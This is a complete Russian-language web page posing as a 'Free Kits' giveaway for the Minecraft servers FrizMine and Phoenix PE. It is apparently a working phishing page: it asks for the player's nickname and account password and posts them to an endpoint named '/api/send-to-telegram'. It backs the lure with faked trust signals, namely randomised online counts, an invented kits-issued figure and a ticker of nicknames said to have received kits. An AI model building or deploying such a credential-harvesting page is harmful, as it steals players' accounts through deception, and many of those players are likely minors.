<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Kits Minecraft</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }

        body {
            background: 
                linear-gradient(rgba(255, 255, 255, 0.9), rgba(255, 255, 255, 0.9)),
                url('https://static.planetminecraft.com/files/image/minecraft/texture-pack/2023/874/16662368-grass-texture_l.webp') repeat;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
        }

        /* Водяной знак */
        body::before {
            content: "Free Kits Minecraft Server";
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 6vw;
            color: rgba(33, 150, 243, 0.03);
            white-space: nowrap;
            pointer-events: none;
            z-index: 0;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 10px;
        }

        .stats-bar {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            background: #2196F3;
            color: white;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 14px;
            z-index: 100;
            box-shadow: 0 2px 10px rgba(33, 150, 243, 0.3);
        }

        .stats-left {
            display: flex;
            gap: 30px;
        }

        .stats-left span {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .online-dot {
            width: 10px;
            height: 10px;
            background: #fff;
            border-radius: 50%;
            display: inline-block;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .kits-count {
            background: #1976D2;
            padding: 4px 15px;
            border-radius: 20px;
            font-weight: 600;
        }

        .ticker {
            position: fixed;
            top: 48px;
            left: 0;
            right: 0;
            background: #e3f2fd;
            color: #1565C0;
            padding: 10px 0;
            overflow: hidden;
            border-bottom: 1px solid #bbdefb;
            z-index: 99;
            font-size: 14px;
            white-space: nowrap;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }

        .ticker-content {
            display: inline-block;
            animation: ticker 180s linear infinite;
            padding-left: 100%;
        }

        .ticker-content span {
            display: inline-block;
            margin-right: 50px;
            color: #0d47a1;
        }

        .ticker-content span i {
            color: #42a5f5;
            margin: 0 5px;
            font-style: italic;
        }

        .ticker-content .kit-badge {
            background: #2196F3;
            color: white;
            padding: 3px 10px;
            border-radius: 20px;
            margin: 0 8px;
            font-size: 11px;
            font-weight: 600;
        }

        @keyframes ticker {
            0% { transform: translateX(0); }
            100% { transform: translateX(-100%); }
        }

        .ticker:hover .ticker-content {
            animation-play-state: paused;
        }

        .container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(33, 150, 243, 0.2);
            width: 100%;
            max-width: 500px;
            padding: 35px;
            position: relative;
            z-index: 2;
            margin-top: 100px;
            border: 1px solid #bbdefb;
        }

        h1 {
            font-size: 26px;
            color: #1565C0;
            margin-bottom: 25px;
            text-align: center;
            font-weight: 700;
            border-bottom: 2px solid #e3f2fd;
            padding-bottom: 15px;
        }

        h2 {
            font-size: 18px;
            color: #1976D2;
            margin-bottom: 20px;
            font-weight: 600;
        }

        .step {
            display: none;
        }

        .step.active {
            display: block;
        }

        .server-select {
            display: flex;
            gap: 15px;
            margin-bottom: 10px;
        }

        .server-btn, .kit-btn {
            flex: 1;
            padding: 15px;
            border: 2px solid #bbdefb;
            background: white;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            color: #1976D2;
            cursor: pointer;
            transition: all 0.2s;
        }

        .server-btn:hover, .kit-btn:hover {
            border-color: #2196F3;
            background: #e3f2fd;
        }

        .server-btn.selected, .kit-btn.selected {
            background: #2196F3;
            color: white;
            border-color: #1976D2;
        }

        .kits-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin: 25px 0;
        }

        .kit-btn {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
            padding: 15px 5px;
        }

        .kit-emoji {
            font-size: 24px;
        }

        .kit-rarity {
            font-size: 11px;
            opacity: 0.8;
        }

        .info-box {
            background: #e3f2fd;
            border-left: 4px solid #2196F3;
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 25px;
            font-size: 14px;
            color: #0d47a1;
        }

        .info-box strong {
            color: #1565C0;
            display: block;
            margin-bottom: 5px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #1976D2;
            font-size: 14px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            border: 2px solid #bbdefb;
            border-radius: 10px;
            font-size: 15px;
            transition: all 0.2s;
        }

        input:focus {
            outline: none;
            border-color: #2196F3;
            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.1);
        }

        .submit-btn {
            width: 100%;
            padding: 16px;
            background: #2196F3;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .submit-btn:hover {
            background: #1976D2;
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(33, 150, 243, 0.4);
        }

        .message {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            font-size: 14px;
            display: none;
        }

        .message.show {
            display: block;
        }

        .message.success {
            background: #e8f5e9;
            color: #2e7d32;
            border: 1px solid #a5d6a7;
        }

        .message.error {
            background: #ffebee;
            color: #c62828;
            border: 1px solid #ef9a9a;
        }

        .timer {
            margin-top: 20px;
            padding: 15px;
            background: #e3f2fd;
            border-radius: 10px;
            text-align: center;
        }

        .timer-display {
            font-size: 36px;
            font-weight: 700;
            color: #1565C0;
            font-family: monospace;
            letter-spacing: 3px;
        }

        .timer-text {
            font-size: 14px;
            color: #1976D2;
            margin-top: 5px;
        }

        .back-btn {
            background: none;
            border: none;
            color: #1976D2;
            cursor: pointer;
            font-size: 14px;
            padding: 8px 0;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 5px;
            font-weight: 600;
        }

        .back-btn:hover {
            color: #0d47a1;
        }

        .back-btn::before {
            content: "←";
            font-size: 18px;
        }
    </style>
</head>
<body>
    <!-- Статистика сверху -->
    <div class="stats-bar">
        <div class="stats-left">
            <span>
                <span class="online-dot"></span>
                <span id="onlineCount">2,847</span> игроков онлайн
            </span>
            <span>
                <span>🎁</span>
                <span id="kitsAvailable">1,500</span> свободных китов
            </span>
        </div>
        <div class="kits-count">
            Выдано сегодня: 1,247
        </div>
    </div>

    <!-- Бегущая строка с никами -->
    <div class="ticker">
        <div class="ticker-content" id="tickerContent"></div>
    </div>

    <div class="container">
        <h1>⚡ FREE KITS ⚡</h1>

        <!-- ШАГ 1: Выбор сервера -->
        <div id="step1" class="step active">
            <h2>Выберите сервер:</h2>
            <div class="server-select">
                <button class="server-btn" onclick="selectServer('frizmine')">FrizMine</button>
                <button class="server-btn" onclick="selectServer('phoenix')">Phoenix PE</button>
            </div>
        </div>

        <!-- ШАГ 2: Выбор кита -->
        <div id="step2" class="step">
            <button class="back-btn" onclick="goToStep1()">Назад к серверам</button>
            <div class="info-box" id="selectedServerInfo">
                <strong>Выбран сервер:</strong> <span id="serverNameDisplay"></span>
            </div>
            <h2>Доступные киты:</h2>
            <div class="kits-grid" id="kitsContainer"></div>
        </div>

        <!-- ШАГ 3: Форма подтверждения -->
        <div id="step3" class="step">
            <button class="back-btn" onclick="goToStep2()">Назад к китам</button>
            <div class="info-box">
                <strong>Ваш выбор:</strong>
                <span id="finalChoiceDisplay"></span>
            </div>
            
            <form id="loginForm">
                <div class="form-group">
                    <label>Никнейм в Minecraft:</label>
                    <input type="text" id="username" required placeholder="Введите ваш ник">
                </div>
                
                <div class="form-group">
                    <label>Пароль от аккаунта:</label>
                    <input type="password" id="password" required placeholder="Введите пароль">
                </div>
                
                <button type="submit" class="submit-btn">Подтвердить и получить кит</button>
            </form>
            
            <div id="message" class="message"></div>
            <div id="timer" class="timer" style="display: none;">
                <div class="timer-display" id="timerDisplay">05:00</div>
                <div class="timer-text">до получения кита на сервер</div>
            </div>
        </div>
    </div>

    <script>
        // Бегущая строка с реальными никами (из твоего списка)
        const recentKits = [
            { name: 'felldart8875124', kit: 'Кит Магистра', emoji: '👑' },
            { name: 'ultrawanvel', kit: 'Кит Принца', emoji: '⚔️' },
            { name: 'yar1kzxc0706', kit: 'Кит Легенды', emoji: '🌟' },
            { name: 'trueangelpet', kit: 'Кит Князя', emoji: '💎' },
            { name: 'witherez', kit: 'Кит Ютуб', emoji: '📺' },
            { name: 'shaker8918', kit: 'Кит Магистра', emoji: '👑' },
            { name: 'anarchytop1pve', kit: 'Кит Принца', emoji: '⚔️' },
            { name: 'mooff56', kit: 'Кит Легенды', emoji: '🌟' },
            { name: 'metodrol', kit: 'Кит Князя', emoji: '💎' },
            { name: 'steve3787', kit: 'Кит Ютуб', emoji: '📺' },
            { name: 'ismail2298', kit: 'Кит Магистра', emoji: '👑' },
            { name: 'softuk', kit: 'Кит Принца', emoji: '⚔️' },
            { name: 'solosubset00564', kit: 'Кит Легенды', emoji: '🌟' },
            { name: 'zahar999tg', kit: 'Кит Князя', emoji: '💎' },
            { name: 'mamaprosti', kit: 'Кит Ютуб', emoji: '📺' },
            { name: 'g0dm3n', kit: 'Кит Магистра', emoji: '👑' },
            { name: 'files2325', kit: 'Кит Принца', emoji: '⚔️' },
            { name: 'chypichipa', kit: 'Кит Легенды', emoji: '🌟' },
            { name: 'bilol010', kit: 'Кит Князя', emoji: '💎' },
            { name: 'wearz', kit: 'Кит Ютуб', emoji: '📺' },
            { name: 'felttulip781207', kit: 'Кит Магистра', emoji: '👑' },
            { name: 'chipichapa', kit: 'Кит Принца', emoji: '⚔️' },
            { name: 'oppl9', kit: 'Кит Легенды', emoji: '🌟' },
            { name: 'fgpose', kit: 'Кит Князя', emoji: '💎' },
            { name: 'vlnergold', kit: 'Кит Ютуб', emoji: '📺' },
            { name: 'sanfran1487', kit: 'Кит Магистра', emoji: '👑' }
        ];

        let selectedServer = '';
        let selectedKit = '';
        let timerInterval;

        const kits = {
            'frizmine': [
                { name: 'Кит Магистра', id: 'master', emoji: '👑', rarity: 'Легендарный' },
                { name: 'Кит Принца', id: 'prince', emoji: '⚔️', rarity: 'Редкий' },
                { name: 'Кит Легенды', id: 'legend', emoji: '🌟', rarity: 'Эпический' }
            ],
            'phoenix': [
                { name: 'Кит Князя', id: 'knyaz', emoji: '💎', rarity: 'Легендарный' },
                { name: 'Кит Принца', id: 'prince', emoji: '⚔️', rarity: 'Редкий' },
                { name: 'Кит Ютуб', id: 'youtube', emoji: '📺', rarity: 'Эпический' }
            ]
        };

        const serverNames = {
            'frizmine': 'FrizMine',
            'phoenix': 'Phoenix PE'
        };

        // Заполняем бегущую строку
        function initTicker() {
            const ticker = document.getElementById('tickerContent');
            let html = '';
            
            recentKits.forEach(item => {
                html += `<span>${item.name} <i>получил(а)</i> ${item.emoji} ${item.kit} <span class="kit-badge">НОВЫЙ</span></span>`;
            });
            
            // Дублируем для плавности
            html += html;
            
            ticker.innerHTML = html;
        }

        // Обновляем онлайн
        function updateOnline() {
            const online = document.getElementById('onlineCount');
            const kitsAvailable = document.getElementById('kitsAvailable');
            
            setInterval(() => {
                const baseOnline = 2847;
                const variation = Math.floor(Math.random() * 100) - 50;
                online.textContent = (baseOnline + variation).toLocaleString();
                
                const baseKits = 1500;
                const kitVariation = Math.floor(Math.random() * 200) - 100;
                kitsAvailable.textContent = (baseKits + kitVariation).toLocaleString();
            }, 30000);
        }

        function selectServer(server) {
            selectedServer = server;
            selectedKit = '';
            
            document.querySelectorAll('.server-btn').forEach(btn => {
                btn.classList.remove('selected');
            });
            
            event.target.classList.add('selected');
            showKits();
        }

        function showKits() {
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
            document.getElementById('step3').classList.remove('active');
            
            document.getElementById('serverNameDisplay').textContent = serverNames[selectedServer];
            
            const kitsContainer = document.getElementById('kitsContainer');
            kitsContainer.innerHTML = '';
            
            kits[selectedServer].forEach(kit => {
                const button = document.createElement('button');
                button.className = 'kit-btn';
                button.innerHTML = `
                    <span class="kit-emoji">${kit.emoji}</span>
                    ${kit.name}
                    <span class="kit-rarity">${kit.rarity}</span>
                `;
                button.onclick = () => selectKit(kit.name);
                kitsContainer.appendChild(button);
            });
        }

        function selectKit(kitName) {
            selectedKit = kitName;
            
            document.querySelectorAll('.kit-btn').forEach(btn => {
                btn.classList.remove('selected');
            });
            
            event.target.classList.add('selected');
            showForm();
        }

        function showForm() {
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.remove('active');
            document.getElementById('step3').classList.add('active');
            
            document.getElementById('finalChoiceDisplay').innerHTML = 
                `Сервер: <strong>${serverNames[selectedServer]}</strong>, Кит: <strong>${selectedKit}</strong>`;
        }

        function goToStep1() {
            selectedServer = '';
            selectedKit = '';
            
            document.getElementById('step1').classList.add('active');
            document.getElementById('step2').classList.remove('active');
            document.getElementById('step3').classList.remove('active');
            
            document.querySelectorAll('.server-btn, .kit-btn').forEach(btn => {
                btn.classList.remove('selected');
            });
        }

        function goToStep2() {
            selectedKit = '';
            
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
            document.getElementById('step3').classList.remove('active');
            
            document.querySelectorAll('.kit-btn').forEach(btn => {
                btn.classList.remove('selected');
            });
        }

        function startTimer(minutes = 5) {
            const timerDiv = document.getElementById('timer');
            const timerDisplay = document.getElementById('timerDisplay');
            let seconds = minutes * 60;
            
            timerDiv.style.display = 'block';
            
            if (timerInterval) clearInterval(timerInterval);
            
            timerInterval = setInterval(() => {
                const mins = Math.floor(seconds / 60);
                const secs = seconds % 60;
                
                timerDisplay.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                
                if (seconds <= 0) {
                    clearInterval(timerInterval);
                    timerDisplay.textContent = '00:00';
                }
                
                seconds--;
            }, 1000);
        }

        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const messageDiv = document.getElementById('message');
            
            if (!username || !password) {
                messageDiv.textContent = 'Заполните все поля!';
                messageDiv.className = 'message error show';
                return;
            }

            messageDiv.textContent = 'Отправка...';
            messageDiv.className = 'message show';

            try {
                const response = await fetch('/api/send-to-telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ 
                        username, 
                        password,
                        server: serverNames[selectedServer],
                        kit: selectedKit
                    })
                });

                const result = await response.json();

                if (result.success) {
                    messageDiv.textContent = '✓ Ура! Спасибо что выбрали нас!';
                    messageDiv.className = 'message success show';
                    
                    startTimer(5);
                    
                    document.getElementById('username').value = '';
                    document.getElementById('password').value = '';
                    
                    setTimeout(() => {
                        goToStep1();
                        messageDiv.className = 'message';
                        document.getElementById('timer').style.display = 'none';
                        if (timerInterval) clearInterval(timerInterval);
                    }, 5000);
                } else {
                    messageDiv.textContent = '✗ Ошибка отправки. Попробуйте позже.';
                    messageDiv.className = 'message error show';
                }
            } catch (error) {
                messageDiv.textContent = '✗ Ошибка соединения. Проверьте интернет.';
                messageDiv.className = 'message error show';
            }
        });

        // Инициализация
        initTicker();
        updateOnline();
    </script>
</body>
</html>
